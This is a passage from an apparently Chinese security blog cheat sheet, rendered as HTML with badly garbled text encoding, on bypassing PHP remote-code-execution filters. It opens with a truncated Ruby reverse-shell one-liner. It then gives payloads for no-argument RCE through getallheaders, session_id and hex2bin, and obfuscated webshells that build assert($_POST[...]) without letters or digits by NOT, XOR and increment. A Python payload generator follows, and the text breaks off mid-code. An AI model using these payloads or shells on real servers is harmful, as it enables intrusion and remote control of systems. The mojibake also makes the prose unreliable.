&#x27;f=TCPSocket.open(&quot;ip&quot;,port).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span><br></pre></td></tr></table></figure><h1 id="æ— å‚æ•°RCE"><a href="#æ— å‚æ•°RCE" class="headerlink" title="æ— å‚æ•°RCE"></a>æ— å‚æ•°RCE</h1><ul><li>æ— å‚æ•°rceï¼šé€šè¿‡æ²¡æœ‰å‚æ•°çš„å‡½æ•°è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„ç›®çš„ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span>===<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])&#123;</span><br><span class="line">      <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>å¦‚æœ<code>&#39;;&#39;===preg_replace(...)</code>ï¼Œé‚£ä¹ˆå°±æ‰§è¡Œexpä¼ é€’çš„å‘½ä»¤</li><li><code>\</code> : è½¬ä¹‰å­—ç¬¦ä¸å¤šè¯´äº†</li><li><code>[a-z,_]+</code> : <code>[a-z,_]</code>åŒ¹é…å°å†™å­—æ¯å’Œä¸‹åˆ’çº¿ <code>+</code>è¡¨ç¤º1åˆ°å¤šä¸ª</li><li><code>(?R)?</code> : <code>(?R)</code>ä»£è¡¨å½“å‰è¡¨è¾¾å¼ï¼Œå°±æ˜¯è¿™ä¸ª(/[a-z,_]+((?R)?)/)ï¼Œæ‰€ä»¥ä¼šä¸€ç›´é€’å½’ï¼Œ<code>?</code>è¡¨ç¤ºé€’å½’å½“å‰è¡¨è¾¾å¼0æ¬¡æˆ–1æ¬¡ï¼ˆè‹¥æ˜¯<code>(?R)*</code>åˆ™è¡¨ç¤ºé€’å½’å½“å‰è¡¨è¾¾å¼0æ¬¡æˆ–å¤šæ¬¡ï¼Œä¾‹å¦‚å®ƒå¯ä»¥åŒ¹é…<code>a(b(c()d()))</code>ï¼‰</li></ul><blockquote><p>ç®€å•è¯´æ¥å°±æ˜¯ï¼šè¿™ä¸²ä»£ç æ£€æŸ¥äº†æˆ‘ä»¬é€šè¿‡GETæ–¹å¼ä¼ å…¥çš„expå‚æ•°çš„å€¼ï¼Œå¦‚æœä¼ è¿›å»çš„å€¼æ˜¯ä¼ è¿›å»çš„å€¼æ˜¯å­—ç¬¦ä¸²æ¥ä¸€ä¸ª()ï¼Œé‚£ä¹ˆå­—ç¬¦ä¸²å°±ä¼šè¢«æ›¿æ¢ä¸ºç©ºã€‚å¦‚æœï¼ˆé€’å½’ï¼‰æ›¿æ¢åçš„å­—ç¬¦ä¸²åªå‰©ä¸‹<code>;</code>,é‚£ä¹ˆæˆ‘ä»¬ä¼ è¿›å»çš„ exp å°±ä¼šè¢« eval æ‰§è¡Œã€‚æ¯”å¦‚æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ª <code>phpinfo();</code>ï¼Œå®ƒè¢«æ›¿æ¢åå°±åªå‰©ä¸‹<code>;</code>ï¼Œé‚£ä¹ˆæ ¹æ®åˆ¤æ–­æ¡ä»¶å°±ä¼šæ‰§è¡Œ<code>phpinfo();</code>ã€‚</p><p><code>(?R)?</code>èƒ½åŒ¹é…çš„åªæœ‰<code>a(); a(b()); a(b(c()));</code>è¿™ç§ç±»å‹çš„ã€‚æ¯”å¦‚ä¼ å…¥<code>a(b(c()));</code>ï¼Œç¬¬ä¸€æ¬¡åŒ¹é…åï¼Œå°±å‰©<code>a(b());</code>ï¼Œç¬¬äºŒæ¬¡åŒ¹é…åï¼Œ<code>a();</code>ï¼Œç¬¬ä¸‰æ¬¡åŒ¹é…åå°±åªå‰©ä¸‹<code>;</code>äº†ï¼Œæœ€å<code>a(b(c()));</code>å°±ä¼šè¢«evalæ‰§è¡Œã€‚</p></blockquote><h2 id="å¸¸è§ç»•è¿‡å§¿åŠ¿"><a href="#å¸¸è§ç»•è¿‡å§¿åŠ¿" class="headerlink" title="å¸¸è§ç»•è¿‡å§¿åŠ¿"></a>å¸¸è§ç»•è¿‡å§¿åŠ¿</h2><h3 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h3><ul><li>è·å–å…¨éƒ¨HTTPè¯·æ±‚å¤´ä¿¡æ¯</li></ul><blockquote><p><code>getallheaders()</code>è¿”å›æ‰€æœ‰çš„HTTPå¤´ä¿¡æ¯ï¼Œä½†æ˜¯è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯è¿™ä¸ªå‡½æ•°è¿”å›çš„æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œè€Œeval()è¦æ±‚çš„å‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¿™é‡Œä¸èƒ½ç›´æ¥ç”¨ï¼Œè¿™æ—¶æˆ‘ä»¬å°±è¦æƒ³åŠæ³•å°†æ•°ç»„è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚æ­£å¥½<code>implode()</code>è¿™ä¸ªå‡½æ•°å°±èƒ½èƒœä»»ã€‚</p></blockquote><ul><li><code>implode()</code>ï¼šå°†ä¸€ä¸ªä¸€ç»´æ•°ç»„çš„å€¼è½¬åŒ–ä¸ºå­—ç¬¦ä¸²</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">implode</span>(<span class="title function_ invoke__">getallheaders</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>åˆ©ç”¨ä¸Šè¿°ä»£ç å³å¯å°†HTTPè¯·æ±‚å¤´çš„ä¿¡æ¯è¾“å‡ºï¼Œæ­¤æ—¶éšæ„æ„é€ ä¸€ä¸ªè¯·æ±‚å¤´ï¼Œå†…å®¹ä¸ºæ¶æ„ä»£ç å¹¶å°†åé¢å†…å®¹æ³¨é‡Šæ‰ï¼Œå³å¯è·å¾—ä¿¡æ¯ã€‚</li></ul><h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><ul><li>è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„</li></ul><blockquote><p><code>var_dump(get_defined_vars());</code>å¯ä»¥å°†æ‰€æœ‰å·²å®šä¹‰çš„å˜é‡ä»¥äºŒç»´æ•°ç»„çš„å½¢å¼è¾“å‡ºã€‚</p></blockquote><ul><li><code>current()</code>ï¼šè¿”å›æ•°ç»„ä¸­çš„å½“å‰å€¼</li></ul><h3 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h3><ul><li>è·å–/è®¾ç½®å½“å‰ä¼šè¯IDï¼Œè¿™ä¸ªå‡½æ•°æ¥è·å–cookieä¸­çš„<code>phpsessionid</code>äº†ï¼Œå¹¶ä¸”è¿™ä¸ªå€¼æˆ‘ä»¬æ˜¯å¯æ§çš„ã€‚</li><li><p>é™åˆ¶ï¼š<strong>æ–‡ä»¶ä¼šè¯ç®¡ç†å™¨ä»…å…è®¸ä¼šè¯ ID ä¸­ä½¿ç”¨ä»¥ä¸‹å­—ç¬¦ï¼ša-z A-Z 0-9 ,ï¼ˆé€—å·ï¼‰å’Œ - ï¼ˆå‡å·ï¼‰</strong></p></li><li><p>è§£å†³åŠæ³•ï¼šå°†å‚æ•°è½¬åŒ–ä¸º16è¿›åˆ¶ä¼ è¿›å»ï¼Œä¹‹åå†ç”¨hex2bin()å‡½æ•°è½¬æ¢å›æ¥ã€‚</p><ul><li><code>hex2bin()</code>ï¼šè½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</li></ul></li><li><p>ä½¿ç”¨å‰ææ¡ä»¶ï¼šéœ€è¦å¼€å¯<code>session_start()</code>æ‰€ä»¥å³å¯æ„é€ <code>eval(hex2bin(session_id(session_start())))</code></p></li><li><p>ä½¿ç”¨æ­¤payloadæ—¶ï¼Œéœ€è¦æ„é€ cookieè¯·æ±‚å¤´ï¼Œ<code>Cookie: PHPSESSID=æ‰§è¡Œä»£ç çš„16è¿›åˆ¶</code></p></li></ul><h2 id="é…åˆä½¿ç”¨çš„å‡½æ•°"><a href="#é…åˆä½¿ç”¨çš„å‡½æ•°" class="headerlink" title="é…åˆä½¿ç”¨çš„å‡½æ•°"></a>é…åˆä½¿ç”¨çš„å‡½æ•°</h2><ul><li><code>getcwd()</code> å‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚</li><li><code>scandir()</code> å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚</li><li><code>dirname()</code> å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚</li><li><code>chdir()</code> å‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚</li><li><code>readfile()</code> è¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚</li><li><code>current()</code> è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚</li><li><p><code>pos()</code> current() çš„åˆ«åã€‚</p></li><li><p><code>next()</code> å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p></li><li><code>end()</code> å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</li><li><code>array_rand()</code> å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„éšæœºé”®åï¼Œæˆ–è€…å¦‚æœæ‚¨è§„å®šå‡½æ•°è¿”å›ä¸åªä¸€ä¸ªé”®åï¼Œåˆ™è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚</li><li><code>array_flip()</code> array_flip() å‡½æ•°ç”¨äºåè½¬/äº¤æ¢æ•°ç»„ä¸­æ‰€æœ‰çš„é”®åä»¥åŠå®ƒä»¬å…³è”çš„é”®å€¼ã€‚</li><li><code>array_pop()</code> åˆ é™¤å¹¶è¿”å›æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ </li><li><code>array_slice()</code> å‡½æ•°åœ¨æ•°ç»„ä¸­æ ¹æ®æ¡ä»¶å–å‡ºä¸€æ®µå€¼ï¼Œå¹¶è¿”å›ã€‚</li><li><code>array_reverse()</code> å‡½æ•°è¿”å›ç¿»è½¬é¡ºåºçš„æ•°ç»„ã€‚</li><li><code>chr()</code> å‡½æ•°ä»æŒ‡å®šçš„ ASCII å€¼è¿”å›å­—ç¬¦ã€‚</li><li><code>hex2bin()</code> â€” è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚</li><li><code>getenv()</code> è·å–ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼(åœ¨7.1ä¹‹åå¯ä»¥ä¸ç»™äºˆå‚æ•°)ã€‚</li><li><code>localeconv()</code> å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚</li><li><code>highlight_file()</code>æ‰“å°è¾“å‡ºæˆ–è€…è¿”å› filename æ–‡ä»¶ä¸­è¯­æ³•é«˜äº®ç‰ˆæœ¬çš„ä»£ç ï¼Œç›¸å½“äºå°±æ˜¯ç”¨æ¥è¯»å–æ–‡ä»¶çš„</li></ul><h1 id="æ— æ•°å­—ã€å­—æ¯rce"><a href="#æ— æ•°å­—ã€å­—æ¯rce" class="headerlink" title="æ— æ•°å­—ã€å­—æ¯rce"></a>æ— æ•°å­—ã€å­—æ¯rce</h1><p><a href="https://xz.aliyun.com/t/8107">æ— å­—æ¯æ•°å­—rceæ€»ç»“ </a></p><h2 id="å–å"><a href="#å–å" class="headerlink" title="å–å"></a>å–å</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;eval($_POST[1]);&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><p><code>shellï¼š(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4);</code></p><h2 id="å¼‚æˆ–"><a href="#å¼‚æˆ–" class="headerlink" title="å¼‚æˆ–"></a>å¼‚æˆ–</h2><ul><li>å¼‚æˆ–è„šæœ¬</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;%&quot;</span>.<span class="title function_ invoke__">dechex</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$a</span>[<span class="variable">$i</span>])^<span class="number">0xff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;^&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;%ff&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;#&#x27;</span>^<span class="string">&#x27;|&#x27;</span>); <span class="comment">//å¾—åˆ°å­—ç¬¦ _</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;.&#x27;</span>^<span class="string">&#x27;~&#x27;</span>); <span class="comment">//å¾—åˆ°å­—ç¬¦ P    </span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;/&#x27;</span>^<span class="string">&#x27;`&#x27;</span>); <span class="comment">//å¾—åˆ°å­—ç¬¦ 0    </span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;|&#x27;</span>^<span class="string">&#x27;/&#x27;</span>); <span class="comment">//å¾—åˆ°å­—ç¬¦ S    </span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;&#123;&#x27;</span>^<span class="string">&#x27;/&#x27;</span>); <span class="comment">//å¾—åˆ°å­—ç¬¦ T    </span></span><br><span class="line"><span class="variable">$__</span>=(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>).(<span class="string">&quot;.&quot;</span>^<span class="string">&quot;~&quot;</span>).(<span class="string">&quot;/&quot;</span>^<span class="string">&quot;`&quot;</span>).(<span class="string">&quot;|&quot;</span>^<span class="string">&quot;/&quot;</span>).(<span class="string">&quot;&#123;&quot;</span>^<span class="string">&quot;/&quot;</span>);  <span class="comment">//å˜é‡$__å€¼ä¸ºå­—ç¬¦ä¸²&#x27;_POST&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span> = <span class="string">&quot;!((%)(&quot;</span>^<span class="string">&quot;@[[@[\\&quot;</span>;   <span class="comment">//æ„é€ å‡ºassert</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;!+/((&quot;</span>^<span class="string">&quot;~&#123;`&#123;|&quot;</span>;   <span class="comment">//æ„é€ å‡º_POST</span></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$$__</span>;   <span class="comment">//$___ = $_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);   <span class="comment">//assert($_POST[_]);</span></span><br></pre></td></tr></table></figure><blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºæˆ‘ä»¬çš„Payloadä¸­å«æœ‰ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œæˆ‘ä»¬éœ€è¦å¯¹Payloadè¿›è¡Œä¸€æ¬¡URLç¼–ç ã€‚</p></blockquote><h2 id="æˆ–"><a href="#æˆ–" class="headerlink" title="æˆ–"></a>æˆ–</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line">content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">preg = <span class="string">&#x27;[a-z]|[0-9]&#x27;</span> <span class="comment"># é¢˜ç›®è¿‡æ»¤æ­£åˆ™</span></span><br><span class="line"><span class="comment"># ç”Ÿæˆå­—å…¸</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (re.<span class="keyword">match</span>(preg, <span class="built_in">chr</span>(i), re.I) <span class="keyword">or</span> re.<span class="keyword">match</span>(preg, <span class="built_in">chr</span>(j), re.I)):</span><br><span class="line">            k = i | j</span><br><span class="line">            <span class="keyword">if</span> <span class="number">32</span> &lt;= k &lt;= <span class="number">126</span>:</span><br><span class="line">                a = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">hex</span>(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                b = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">hex</span>(j)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                content += (<span class="built_in">chr</span>(k) + <span class="string">&#x27; &#x27;</span> + a + <span class="string">&#x27; &#x27;</span> + b + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;rce_or.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    payload1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    code = <span class="built_in">input</span>(<span class="string">&quot;data:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> code:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&#x27;rce_or.txt&#x27;</span>)</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            <span class="keyword">if</span> i == line[<span class="number">0</span>]:</span><br><span class="line">                payload1 = payload1 + line[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                payload2 = payload2 + line[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    payload = <span class="string">&#x27;(&quot;&#x27;</span>+payload1+<span class="string">&#x27;&quot;|&quot;&#x27;</span>+payload2+<span class="string">&#x27;&quot;)&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;payload: &quot;</span>+ payload)</span><br></pre></td></tr></table></figure><h2 id="è‡ªå¢"><a href="#è‡ªå¢" class="headerlink" title="è‡ªå¢"></a>è‡ªå¢</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="variable">$_</span>++;</span><br></pre></td></tr></table></figure><blockquote><p>$++å¯¹å˜é‡è¿›è¡Œäº†è‡ªå¢æ“ä½œ,ç”±äºæˆ‘ä»¬æ²¡æœ‰å®šä¹‰çš„å€¼,PHPä¼šç»™èµ‹ä¸€ä¸ªé»˜è®¤å€¼NULL==0,ç”±æ­¤æˆ‘ä»¬å¯ä»¥çœ‹å‡º,æˆ‘ä»¬å¯ä»¥åœ¨ä¸ä½¿ç”¨ä»»ä½•æ•°å­—çš„æƒ…å†µä¸‹,é€šè¿‡å¯¹æœªå®šä¹‰å˜é‡çš„è‡ªå¢æ“ä½œæ¥å¾—åˆ°ä¸€ä¸ªæ•°å­— </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;A&quot;</span>++ ==&gt; <span class="string">&quot;B&quot;</span></span><br><span class="line"><span class="string">&quot;B&quot;</span>++ ==&gt; <span class="string">&quot;C&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿå¾—åˆ°â€Aâ€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½é€šè¿‡è‡ªå¢è‡ªå‡ï¼Œå¾—åˆ°æ‰€æœ‰çš„å­—æ¯ã€‚ é‚£ä¹ˆé—®é¢˜å°±è½¬åŒ–ä¸ºæ€ä¹ˆå¾—åˆ°ä¸€ä¸ªå­—ç¬¦â€Aâ€ã€‚åœ¨PHPä¸­ï¼Œå¦‚æœå¼ºåˆ¶è¿æ¥æ•°ç»„å’Œå­—ç¬¦ä¸²çš„è¯ï¼Œæ•°ç»„å°†è¢«è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå…¶å€¼ä¸ºâ€Arrayâ€ã€‚å†å–è¿™ä¸ªå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—æ¯ï¼Œå°±å¯ä»¥è·å¾—â€Aâ€ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;&#x27;</span>.[];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><blockquote><p>$<em>++å¯¹</em>å˜é‡è¿›è¡Œäº†è‡ªå¢æ“ä½œ,ç”±äºæˆ‘ä»¬æ²¡æœ‰å®šä¹‰*çš„å€¼,PHPä¼šç»™*èµ‹ä¸€ä¸ªé»˜è®¤å€¼NULL==0,ç”±æ­¤æˆ‘ä»¬å¯ä»¥çœ‹å‡º,æˆ‘ä»¬å¯ä»¥åœ¨ä¸ä½¿ç”¨ä»»ä½•æ•°å­—çš„æƒ…å†µä¸‹,é€šè¿‡å¯¹æœªå®šä¹‰å˜é‡çš„è‡ªå¢æ“ä½œæ¥å¾—åˆ°ä¸€ä¸ªæ•°å­—</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;   <span class="comment">//å¾—åˆ°&quot;Array&quot;</span></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$_</span>[<span class="variable">$__</span>];   <span class="comment">//å¾—åˆ°&quot;A&quot;ï¼Œ$__æ²¡æœ‰å®šä¹‰ï¼Œé»˜è®¤ä¸ºFalseä¹Ÿå³0ï¼Œæ­¤æ—¶$___=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$___</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$___</span>;   <span class="comment">//$_=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//å¾—åˆ°&quot;S&quot;ï¼Œæ­¤æ—¶$__=&quot;S&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;AS&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASS&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//å¾—åˆ°&quot;E&quot;ï¼Œæ­¤æ—¶$__=&quot;E&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSE&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>;<span class="variable">$__</span>++;   <span class="comment">//å¾—åˆ°&quot;R&quot;ï¼Œæ­¤æ—¶$__=&quot;R&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSER&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//å¾—åˆ°&quot;T&quot;ï¼Œæ­¤æ—¶$__=&quot;T&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSERT&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$____</span> = <span class="string">&quot;_&quot;</span>;   <span class="comment">//$____=&quot;_&quot;</span></span><br><span class="line"><span 